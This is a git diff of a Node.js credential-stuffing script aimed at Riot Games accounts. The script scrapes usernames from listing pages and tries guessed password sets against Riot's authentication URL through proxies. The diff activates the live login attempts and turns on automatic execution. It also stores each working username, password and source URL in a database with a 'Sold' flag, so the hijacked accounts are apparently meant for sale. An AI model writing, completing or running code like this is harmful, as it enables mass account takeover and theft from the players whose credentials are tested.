@@ -1,5 +1,6 @@
 /* eslint-disable no-await-in-loop */
 const { uuid } = require('uuidv4');
+const HttpsProxyAgent = require('https-proxy-agent');
 
 const { NODE_ENV, RIOT_AUTH_URL } = require('../commons/env');
 const { getNNumbers } = require('../commons/numbers');
@@ -10,6 +11,7 @@ const { axios } = require('../commons/request');
 const proxies = require('../constants/proxies');
 const urls = require('../constants/urls');
 const { getPasswordSet } = require('../constants/tests');
+const { account } = require('../database/models');
 
 const { getUsers } = require('./get_users');
 
@@ -21,14 +23,15 @@ let lastProxy = null;
 
 const changeProxy = async () => {
   const proxy = getProxy();
-  const { host, port } = getProxyInfo();
+  const { host, port } = getProxyInfo(proxy);
   if (proxy !== lastProxy) {
     lastProxy = proxy;
     await axios({
       options: {
         method: 'post',
         url: RIOT_AUTH_URL,
-        proxy: { host, port, protocol: 'http' },
+        // proxy: { host, port, protocol: 'https' },
+        httpsAgent: new HttpsProxyAgent(`http://${host}:${port}`),
         headers: { 'Content-Type': 'application/json' },
         data: {
           client_id: 'rso-web-client-prod',
@@ -44,7 +47,7 @@ const changeProxy = async () => {
   }
   return { host, port, protocol: 'http' };
 };
-const testCredentials = async (username, password, proxyConfig) => {
+const testCredentials = async (url, username, password, proxyConfig) => {
   const options = {
     method: 'put',
     url: RIOT_AUTH_URL,
@@ -58,15 +61,21 @@ const testCredentials = async (username, password, proxyConfig) => {
       username
     }
   };
-  console.log('options', options);
-  // await axios({ options, persist: true });
+  const response = await axios({ options, persist: true });
+  if (!response || (response.status < 200 && response.status >= 300)) return;
+  account.save({
+    UserName: username,
+    Password: password,
+    FromUrl: url,
+    Sold: false
+  });
 };
 const requestUsers = async (url, state) => {
+  console.log('GET', url);
   // User list request
   const userResp = await axios({ options: { url } });
   if (!userResp) return;
   const users = getUsers(userResp.body);
-  console.log('Comparing with', url);
   if (haveSameElements(users, state.lastUsers)) {
     console.log('Same elements', users, state.lastUsers);
     state.pageNum = minPageNum;
@@ -80,9 +89,9 @@ const requestUsers = async (url, state) => {
   for (let i = 0; i < users.length; i += 1) {
     const user = users[i];
     const passwords = getPasswordSet(user);
-    const proxyConfig = await changeProxy();
+    // const proxyConfig = await changeProxy();
     for (let ii = 0; ii < passwords.length; ii += 1) {
-      setTimeout(testCredentials, time, user, passwords[i], proxyConfig);
+      setTimeout(testCredentials, time, url, user, passwords[ii], undefined);
       time += requestInterval;
     }
   }
@@ -100,6 +109,5 @@ const execute = () =>
     execute();
   }, interval);
 
-// if (NODE_ENV !== 'localhost' && +process.env.threadID === 1) execute();
-// TODO remove
+if (NODE_ENV !== 'localhost' && +process.env.threadID === 1) execute();
 // execute();
